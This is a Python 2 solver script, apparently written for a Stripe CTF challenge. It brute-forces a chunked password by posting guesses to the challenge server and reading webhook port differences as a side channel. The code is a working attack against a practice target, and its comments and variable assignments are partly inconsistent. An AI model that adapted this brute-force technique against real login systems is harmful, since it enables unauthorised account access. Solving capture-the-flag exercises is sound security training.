#!/usr/bin/env python 

""" 
A simple request driver
""" 

import time
import urllib

LOCAL = False

local_webhook = 'localhost'
local_webook_port = 50000;
local_host = 'http://localhost:3000'

remote_webhook = 'level02-2.stripe-ctf.com';
remote_webhook_port = 48625;
remote_host = 'https://level08-2.stripe-ctf.com/user-ecietfteks/'

PATH = '/user-leeybkbwpo/uploads/'
last_filename = "last.txt"

WEBHOOK = ''
WEBHOOK_PORT = 0
HOST = ''
if LOCAL:
  WEBHOOK = local_webhook
  WEBHOOK_PORT = local_webhook_port
  HOST = local_host
else:
  WEBHOOK = remote_webhook
  WEBHOOK_PORT = remote_webhook_port
  HOST = remote_host

GARBAGE = '000';
FIRST_CHUNK = '280';
SECOND_CHUNK = '430';
THIRD_CHUNK = '018';
FOURTH_CHUNK = '842';

def try_chunks(first, second, third, fourth):
  # call post to server with concat
  send_post("000000000000", WEBHOOK + ":" + str(WEBHOOK_PORT))
  send_post(first + second + third + fourth, WEBHOOK + ":" + str(WEBHOOK_PORT))
  return

def send_post(password, webhook):
  f = urllib.urlopen(HOST, '{"password": "' + password + '", "webhooks": ["' + webhook + '"]}')
  #print f.read()
  return

# find first chunk
i = 700 # CHANGE
false_positive_retries = 0
while i < 1000:
  str_chunk = '%0*d' % (3, i)
  try_chunks(FIRST_CHUNK, SECOND_CHUNK, THIRD_CHUNK, str_chunk)
  time.sleep(0.050)
  # fetch host/last, check if not 2 or 3, retry. if 3, alert and try again
  read = ''
  if LOCAL:
    f = open(last_filename)
    read = f.read()
  else:
    f = urllib.urlopen("https://" + WEBHOOK + PATH + last_filename)
    read = f.read()
  last_diff_str = read
  last_diff_int = 0
  try:
    last_diff_int = int(last_diff_str)
  except ValueError:
    continue
  print str_chunk + ':' + read
  if last_diff_int == 5:
    # expected, continue
    i += 1
  elif last_diff_int == 1:
    # Retry 5 times in a row
    false_positive_retries += 1
    if false_positive_retries > 4:
      print 'POSSIBLY SUCCESS!!!!!!!!!!!!!!!!!!!!!'
      FIRST_CHUNK = str_chunk
      break
    continue
  false_positive_retries = 0
